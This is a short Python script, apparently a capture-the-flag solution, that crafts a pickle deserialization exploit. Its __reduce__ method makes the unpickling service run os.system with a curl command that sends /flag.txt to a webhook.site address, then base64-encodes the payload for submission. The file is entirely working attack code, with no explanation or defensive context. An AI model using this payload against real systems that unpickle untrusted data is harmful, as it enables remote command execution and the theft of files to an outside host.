import pickle
import base64

class PickleRCE(object):
    def __reduce__(self):
        import os
        return (os.system,('curl --data "@/flag.txt" https://webhook.site/8a273071-a70b-442b-a573-cf5e8581df43',))

payload = base64.b64encode(pickle.dumps(PickleRCE()))  # Crafting Payload
print(payload)